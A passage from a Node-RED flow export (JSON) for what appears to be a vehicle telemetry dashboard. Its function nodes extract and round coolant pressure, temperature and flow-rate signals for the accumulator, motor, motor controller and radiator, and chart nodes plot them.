VCU_accuCoolantTempInDiag,\n    VCU_accuCoolantTempOut,\n    VCU_accuCoolantTempOutDiag\n]",
        "outputs": 4,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 840,
        "y": 300,
        "wires": [
            [
                "19c0b995d3a4b3f0"
            ],
            [
                "19c0b995d3a4b3f0"
            ],
            [
                "19c0b995d3a4b3f0"
            ],
            [
                "19c0b995d3a4b3f0"
            ]
        ]
    },
    {
        "id": "19c0b995d3a4b3f0",
        "type": "ui-chart",
        "z": "43c8977d5bb940cf",
        "group": "58798ceaa3de3da9",
        "name": "(Accum) Temps",
        "label": "Temperatures",
        "order": 3,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "degC",
        "yAxisProperty": "payload",
        "yAxisPropertyType": "msg",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": true,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 1200,
        "y": 300,
        "wires": [
            []
        ]
    },
    {
        "id": "1ad1d97c75f1c940",
        "type": "ui-chart",
        "z": "43c8977d5bb940cf",
        "group": "58798ceaa3de3da9",
        "name": "(Accum) Flow Rate Diagnostic",
        "label": "Flow Rate",
        "order": 2,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "TODO: UNITS NEEDED",
        "yAxisProperty": "VCU_accuCoolantFlowRateDiag",
        "yAxisPropertyType": "property",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": false,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 870,
        "y": 380,
        "wires": [
            []
        ]
    },
    {
        "id": "0d1cd822b7e7b886",
        "type": "ui-chart",
        "z": "43c8977d5bb940cf",
        "group": "93582a4ebf51aaca",
        "name": "(Motor) Pressure",
        "label": "Pressure",
        "order": 1,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "psi",
        "yAxisProperty": "payload",
        "yAxisPropertyType": "msg",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": true,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 1190,
        "y": 540,
        "wires": [
            []
        ]
    },
    {
        "id": "da20fa25b8b42994",
        "type": "function",
        "z": "43c8977d5bb940cf",
        "name": "Extract Motor Pressures",
        "func": "var sigFigs = 2;\n\nvar VCU_motorCoolantPressOut =\n{\n    topic: \"Motor Coolant Pressure Out\",\n    payload: msg.payload.VCU_motorCoolantPressOut\n}\ntry {\n    VCU_motorCoolantPressOut.payload = VCU_motorCoolantPressOut.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_motorCoolantPressIn =\n{\n    topic: \"Motor Coolant Pressure In\",\n    payload: msg.payload.VCU_motorCoolantPressIn\n}\ntry {\n    VCU_motorCoolantPressIn.payload = VCU_motorCoolantPressIn.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_motorCoolantPressOutDiag =\n{\n    topic: \"Motor Coolant Pressure Out Diag\",\n    payload: msg.payload.VCU_motorCoolantPressOutDiag\n}\ntry {\n    VCU_motorCoolantPressOutDiag.payload = VCU_motorCoolantPressOutDiag.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_motorCoolantPressInDiag =\n{\n    topic: \"Motor Coolant Pressure In Diag\",\n    payload: msg.payload.VCU_motorCoolantPressInDiag\n}\ntry {\n    VCU_motorCoolantPressInDiag.payload = VCU_motorCoolantPressInDiag.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    VCU_motorCoolantPressIn,\n    VCU_motorCoolantPressInDiag,\n    VCU_motorCoolantPressOut,\n    VCU_motorCoolantPressOutDiag\n]",
        "outputs": 4,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 850,
        "y": 540,
        "wires": [
            [
                "0d1cd822b7e7b886"
            ],
            [
                "0d1cd822b7e7b886"
            ],
            [
                "0d1cd822b7e7b886"
            ],
            [
                "0d1cd822b7e7b886"
            ]
        ]
    },
    {
        "id": "8c1c49fb1985ec4f",
        "type": "function",
        "z": "43c8977d5bb940cf",
        "name": "Extract Motor Temps",
        "func": "var sigFigs = 2;\n\nvar VCU_motorCoolantTempIn =\n{\n    topic: \"Motor Coolant Temperature In\",\n    payload: msg.payload.VCU_motorCoolantTempIn\n}\ntry {\n    VCU_motorCoolantTempIn.payload = VCU_motorCoolantTempIn.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_motorCoolantTempOut =\n{\n    topic: \"Motor Coolant Temperature Out\",\n    payload: msg.payload.VCU_motorCoolantTempOut\n}\ntry {\n    VCU_motorCoolantTempOut.payload = VCU_motorCoolantTempOut.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_motorCoolantTempOutDiag =\n{\n    topic: \"Motor Coolant Temperature Out Diag\",\n    payload: msg.payload.VCU_motorCoolantTempOutDiag\n}\ntry {\n    VCU_motorCoolantTempOutDiag.payload = VCU_motorCoolantTempOutDiag.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_motorCoolantTempInDiag =\n{\n    topic: \"Motor Coolant Temperature In Diag\",\n    payload: msg.payload.VCU_motorCoolantTempInDiag\n}\ntry {\n    VCU_motorCoolantTempInDiag.payload = VCU_motorCoolantTempInDiag.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    VCU_motorCoolantTempIn,\n    VCU_motorCoolantTempInDiag,\n    VCU_motorCoolantTempOut,\n    VCU_motorCoolantTempOutDiag\n]",
        "outputs": 4,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 840,
        "y": 640,
        "wires": [
            [
                "9096bbcb5c2bbac6"
            ],
            [
                "9096bbcb5c2bbac6"
            ],
            [
                "9096bbcb5c2bbac6"
            ],
            [
                "9096bbcb5c2bbac6"
            ]
        ]
    },
    {
        "id": "9096bbcb5c2bbac6",
        "type": "ui-chart",
        "z": "43c8977d5bb940cf",
        "group": "93582a4ebf51aaca",
        "name": "(Motor) Temps",
        "label": "Temperatures",
        "order": 3,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "degC",
        "yAxisProperty": "payload",
        "yAxisPropertyType": "msg",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": true,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 1170,
        "y": 640,
        "wires": [
            []
        ]
    },
    {
        "id": "d8e935429b998d74",
        "type": "ui-chart",
        "z": "43c8977d5bb940cf",
        "group": "93582a4ebf51aaca",
        "name": "(Motor) Flow Rate Diagnostic",
        "label": "Flow Rate",
        "order": 2,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "TODO: UNITS NEEDED",
        "yAxisProperty": "payload",
        "yAxisPropertyType": "msg",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": false,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 1200,
        "y": 720,
        "wires": [
            []
        ]
    },
    {
        "id": "0b06e1d20ef1fc19",
        "type": "function",
        "z": "43c8977d5bb940cf",
        "name": "Extract Motor Flow Rates",
        "func": "var sigFigs = 2;\n\nvar VCU_motorCoolantFlowRate =\n{\n    topic: \"Motor Coolant Flow Rate\",\n    payload: msg.payload.VCU_motorCoolantFlowRate\n}\ntry {\n    VCU_motorCoolantFlowRate.payload = VCU_motorCoolantFlowRate.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar VCU_motorCoolantFlowRateDiag =\n{\n    topic: \"Motor Coolant Flow Rate Diag\",\n    payload: msg.payload.VCU_motorCoolantFlowRateDiag\n}\ntry {\n    VCU_motorCoolantFlowRateDiag.payload = VCU_motorCoolantFlowRateDiag.payload.toFixed(sigFigs)\n} catch { }\n\n\nreturn [\n    VCU_motorCoolantFlowRate,\n    VCU_motorCoolantFlowRateDiag\n];",
        "outputs": 2,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 850,
        "y": 720,
        "wires": [
            [
                "d8e935429b998d74"
            ],
            [
                "d8e935429b998d74"
            ]
        ]
    },
    {
        "id": "1f7b528ff4d29cdf",
        "type": "ui-chart",
        "z": "43c8977d5bb940cf",
        "group": "d0ab6aac28ac73fd",
        "name": "(MC) Pressure",
        "label": "Pressure",
        "order": 2,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "psi",
        "yAxisProperty": "payload",
        "yAxisPropertyType": "msg",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": true,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 1180,
        "y": 860,
        "wires": [
            []
        ]
    },
    {
        "id": "6fd46876027cf460",
        "type": "function",
        "z": "43c8977d5bb940cf",
        "name": "Extract MC Pressures",
        "func": "var sigFigs = 2;\n\nvar VCU_mcCoolantPressOut =\n{\n    topic: \"Motor Controller Coolant Pressure Out\",\n    payload: msg.payload.VCU_mcCoolantPressOut\n}\ntry {\n    VCU_mcCoolantPressOut.payload = VCU_mcCoolantPressOut.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_mcCoolantPressIn =\n{\n    topic: \"Motor Controller Pressure In\",\n    payload: msg.payload.VCU_mcCoolantPressIn\n}\ntry {\n    VCU_mcCoolantPressIn.payload = VCU_mcCoolantPressIn.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_mcCoolantPressOutDiag =\n{\n    topic: \"Motor Controller Pressure Out Diag\",\n    payload: msg.payload.VCU_mcCoolantPressOutDiag\n}\ntry {\n    VCU_mcCoolantPressOutDiag.payload = VCU_mcCoolantPressOutDiag.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_mcCoolantPressInDiag =\n{\n    topic: \"Motor Controller Coolant Pressure In Diag\",\n    payload: msg.payload.VCU_mcCoolantPressInDiag\n}\ntry {\n    VCU_mcCoolantPressInDiag.payload = VCU_mcCoolantPressInDiag.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    VCU_mcCoolantPressIn,\n    VCU_mcCoolantPressInDiag,\n    VCU_mcCoolantPressOut,\n    VCU_mcCoolantPressOutDiag\n]",
        "outputs": 4,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 840,
        "y": 860,
        "wires": [
            [
                "1f7b528ff4d29cdf"
            ],
            [
                "1f7b528ff4d29cdf"
            ],
            [
                "1f7b528ff4d29cdf"
            ],
            [
                "1f7b528ff4d29cdf"
            ]
        ]
    },
    {
        "id": "7f2a8d3384180cc8",
        "type": "function",
        "z": "43c8977d5bb940cf",
        "name": "Extract MC Temps",
        "func": "var sigFigs = 2;\n\nvar VCU_mcCoolantTempOut =\n{\n    topic: \"Motor Controller Coolant Temperature Out\",\n    payload: msg.payload.VCU_mcCoolantTempOut\n}\ntry {\n    VCU_mcCoolantTempOut.payload = VCU_mcCoolantTempOut.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_mcCoolantTempIn =\n{\n    topic: \"Motor Controller Coolant Temperature In\",\n    payload: msg.payload.VCU_mcCoolantTempIn\n}\ntry {\n    VCU_mcCoolantTempIn.payload = VCU_mcCoolantTempIn.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_mcCoolantTempOutDiag =\n{\n    topic: \"Motor Controller Coolant Temperature Out Diag\",\n    payload: msg.payload.VCU_mcCoolantTempOutDiag\n}\ntry {\n    VCU_mcCoolantTempOutDiag.payload = VCU_mcCoolantTempOutDiag.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_mcCoolantTempInDiag =\n{\n    topic: \"Motor Controller Coolant Temperature In Diag\",\n    payload: msg.payload.VCU_mcCoolantTempInDiag\n}\ntry {\n    VCU_mcCoolantTempInDiag.payload = VCU_mcCoolantTempInDiag.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    VCU_mcCoolantTempIn,\n    VCU_mcCoolantTempInDiag,\n    VCU_mcCoolantTempOut,\n    VCU_mcCoolantTempOutDiag\n]",
        "outputs": 4,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 830,
        "y": 960,
        "wires": [
            [
                "b17dcbb9a2e26f0e"
            ],
            [
                "b17dcbb9a2e26f0e"
            ],
            [
                "b17dcbb9a2e26f0e"
            ],
            [
                "b17dcbb9a2e26f0e"
            ]
        ]
    },
    {
        "id": "b17dcbb9a2e26f0e",
        "type": "ui-chart",
        "z": "43c8977d5bb940cf",
        "group": "d0ab6aac28ac73fd",
        "name": "(MC) Temps",
        "label": "Temperatures",
        "order": 4,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "degC",
        "yAxisProperty": "payload",
        "yAxisPropertyType": "msg",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": true,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 1160,
        "y": 960,
        "wires": [
            []
        ]
    },
    {
        "id": "fd744225ee6c191e",
        "type": "ui-chart",
        "z": "43c8977d5bb940cf",
        "group": "d0ab6aac28ac73fd",
        "name": "(MC) Flow Rate Diagnostic",
        "label": "Flow Rate",
        "order": 3,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "TODO: UNITS NEEDED",
        "yAxisProperty": "payload",
        "yAxisPropertyType": "msg",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": false,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 1200,
        "y": 1040,
        "wires": [
            []
        ]
    },
    {
        "id": "a835f73e7b959351",
        "type": "function",
        "z": "43c8977d5bb940cf",
        "name": "Extract MC Flow Rates",
        "func": "var sigFigs = 2;\n\nvar VCU_mcCoolantFlowRate =\n{\n    topic: \"Motor Controller Coolant Flow Rate\",\n    payload: msg.payload.VCU_mcCoolantFlowRate\n}\ntry {\n    VCU_mcCoolantFlowRate.payload = VCU_mcCoolantFlowRate.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_mcCoolantFlowRateDiag =\n{\n    topic: \"Motor Controller Coolant Flow Rate Diag\",\n    payload: msg.payload.VCU_mcCoolantFlowRateDiag\n}\ntry {\n    VCU_mcCoolantFlowRateDiag.payload = VCU_mcCoolantFlowRateDiag.payload.toFixed(sigFigs)\n} catch { }\n\n\nreturn [\n    VCU_mcCoolantFlowRate,\n    VCU_mcCoolantFlowRateDiag\n];",
        "outputs": 2,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 840,
        "y": 1040,
        "wires": [
            [
                "fd744225ee6c191e"
            ],
            [
                "fd744225ee6c191e"
            ]
        ]
    },
    {
        "id": "212cb3ab5eb2de59",
        "type": "ui-chart",
        "z": "43c8977d5bb940cf",
        "group": "cf0ca1fa373904ee",
        "name": "(Rad) Pressure",
        "label": "Pressure",
        "order": 1,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "psi",
        "yAxisProperty": "payload",
        "yAxisPropertyType": "msg",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": true,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 1180,
        "y": 1160,
        "wires": [
            []
        ]
    },
    {
        "id": "d00f087b201189a4",
        "type": "function",
        "z": "43c8977d5bb940cf",
        "name": "Extract Rad Pressures",
        "func": "var sigFigs = 2;\n\nvar VCU_radCoolantPressOut =\n{\n    topic: \"Radiator Coolant Pressure Out\",\n    payload: msg.payload.VCU_radCoolantPressOut\n}\ntry {\n    VCU_radCoolantPressOut.payload = VCU_radCoolantPressOut.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_radCoolantPressIn =\n{\n    topic: \"Radiator Coolant Pressure In\",\n    payload: msg.payload.VCU_radCoolantPressIn\n}\ntry {\n    VCU_radCoolantPressIn.payload = VCU_radCoolantPressIn.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_radCoolantPressOutDiag =\n{\n    topic: \"Radiator Coolant Pressure Out Diag\",\n    payload: msg.payload.VCU_radCoolantPressOutDiag\n}\ntry {\n    VCU_radCoolantPressOutDiag.payload = VCU_radCoolantPressOutDiag.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_radCoolantPressInDiag =\n{\n    topic: \"Radiator Coolant Pressure In Diag\",\n    payload: msg.payload.VCU_radCoolantPressInDiag\n}\ntry {\n    VCU_radCoolantPressInDiag.payload = VCU_radCoolantPressInDiag.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    VCU_radCoolantPressIn,\n    VCU_radCoolantPressInDiag,\n    VCU_radCoolantPressOut,\n    VCU_radCoolantPressOutDiag\n]",
        "outputs": 4,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 840,
        "y": 1160,
        "wires": [
            [
                "212cb3ab5eb2de59"
            ],
            [
                "212cb3ab5eb2de59"
            ],
            [
                "212cb3ab5eb2de59"
            ],
            [
                "212cb3ab5eb2de59"
            ]
        ]
    },
    {
        "id": "e88b2bfae32741c1",
        "type": "function",
        "z": "43c8977d5bb940cf",
        "name": "Extract Rad Temps",
        "func": "var sigFigs = 2;\n\nvar VCU_radCoolantTempOut =\n{\n    topic: \"Radiator Coolant Temperature Out\",\n    payload: msg.payload.VCU_radCoolantTempOut\n}\ntry {\n    VCU_radCoolantTempOut.payload = VCU_radCoolantTempOut.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_radCoolantTempIn =\n{\n    topic: \"Radiator Coolant Temperature In\",\n    payload: msg.payload.VCU_radCoolantTempIn\n}\ntry {\n    VCU_radCoolantTempIn.payload = VCU_radCoolantTempIn.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_radCoolantTempOutDiag =\n{\n    topic: \"Radiator Coolant Temperature Out Diag\",\n    payload: msg.payload.VCU_radCoolantTempOutDiag\n}\ntry {\n    VCU_radCoolantTempOutDiag.payload = VCU_radCoolantTempOutDiag.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_radCoolantTempInDiag =\n{\n    topic: \"Radiator Coolant Temperature In Diag\",\n    payload: msg.payload.VCU_radCoolantTempInDiag\n}\ntry {\n    VCU_radCoolantTempInDiag.payload = VCU_radCoolantTempInDiag.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    VCU_radCoolantTempIn,\n    VCU_radCoolantTempInDiag,\n    VCU_radCoolantTempOut,\n    VCU_radCoolantTempOutDiag\n]",
        "outputs": 4,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 830,
        "y": 1260,
        "wires": [
            [
                "8eca8688bb80e949"
            ],
            [
                "8eca8688bb80e949"
            ],
            [
                "8eca8688bb80e949"
            ],
            [
                "8eca8688bb80e949"
            ]
        ]
    },
    {
        "id": "8eca8688bb80e949",
        "type": "ui-chart",
        "z": "43c8977d5bb940cf",
        "group": "cf0ca1fa373904ee",
        "name": "(Rad) Temps",
        "label": "Temperatures",
        "order": 3,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "degC",
        "yAxisProperty": "payload",
        "yAxisPropertyType": "msg",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": true,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 1160,
        "y": 1260,
        "wires": [
            []
        ]
    },
    {
        "id": "cf9dc063f2044857",
        "type": "ui-chart",
        "z": "43c8977d5bb940cf",
        "group": "cf0ca1fa373904ee",
        "name": "(Rad) Flow Rate Diagnostic",
        "label": "Flow Rate",
        "order": 2,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "TODO: UNITS NEEDED",
        "yAxisProperty": "VCU_radiatorCoolantFlowRateDiag",
        "yAxisPropertyType": "property",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": false,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": 8,
        "className": "",
        "x": 860,
        "y": 1340,
        "wires": [
            []
        ]
    },
    {
        "id": "e2e9406ea392a512",
        "type": "ui-markdown",
        "z": "43c8977d5bb940cf",
        "group": "d0ab6aac28ac73fd",
        "name": "",
        "order": 1,
        "width": 0,
        "height": 0,
        "content": "## Inverter Limit Coolant Derating: {{msg?.payload.INV_Limit_Coolant_Derating || 'Unknown' }}",
        "className": "",
        "x": 810,
        "y": 800,
        "wires": [
            []
        ]
    },
    {
        "id": "1c3af49ebedf24c4",
        "type": "json",
        "z": "f794ff764964069d",
        "name": "",
        "property": "payload",
        "action": "obj",
        "pretty": false,
        "x": 310,
        "y": 820,
        "wires": [
            [
                "c59d298b8f7753ab",
                "f4d370790d3e2ab6",
                "856b37116d7bb7da",
                "76d902ef73966c33",
                "96bfae3b38012ea1",
                "9df91ec3239745ae",
                "07c5128fcde37bcb",
                "6235d99dfe60139f",
                "b2ba000815b7f5af",
                "60cbdd9a86d077f2",
                "3257f83dc0fae7b1",
                "aab87762908806f5",
                "36f0a88828ee7e8f",
                "f73b21aea3b27ba9",
                "25f9d01ed118ffc1",
                "08f57b92059845e1",
                "49ff2e6f36126537",
                "bd5cbf4d03f5815f",
                "8196dd6bb9f403d8",
                "fead31dbb0d6315c",
                "c0755f802dbe56ad",
                "9869414c19beb90b",
                "e7aac4a1f48965fc"
            ]
        ]
    },
    {
        "id": "edd80306d559ee47",
        "type": "websocket in",
        "z": "f794ff764964069d",
        "name": "",
        "server": "31337e6096350fd4",
        "client": "",
        "x": 130,
        "y": 820,
        "wires": [
            [
                "1c3af49ebedf24c4"
            ]
        ]
    },
    {
        "id": "c59d298b8f7753ab",
        "type": "ui-markdown",
        "z": "f794ff764964069d",
        "group": "5fb4f6a2ce514f5d",
        "name": "",
        "order": 1,
        "width": 0,
        "height": 0,
